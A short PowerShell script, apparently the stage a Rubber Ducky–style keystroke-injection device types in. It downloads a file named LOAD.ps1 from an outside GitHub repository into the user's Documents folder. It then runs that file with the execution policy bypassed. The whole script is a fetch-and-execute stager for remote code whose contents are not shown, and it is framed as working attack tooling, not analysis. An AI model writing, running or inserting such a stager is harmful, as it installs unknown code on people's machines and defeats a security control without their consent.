$documentsPath = [System.Environment]::GetFolderPath('MyDocuments')

$githubUrl = "https://github.com/EmaBixD/Arduino-RubberDucky/raw/main/client/LOAD.ps1"

$destinationFile = "$documentsPath\EmaDev\LOAD.ps1"

Invoke-WebRequest -Uri $githubUrl -OutFile $destinationFile

powershell -ExecutionPolicy Bypass -File $destinationFile
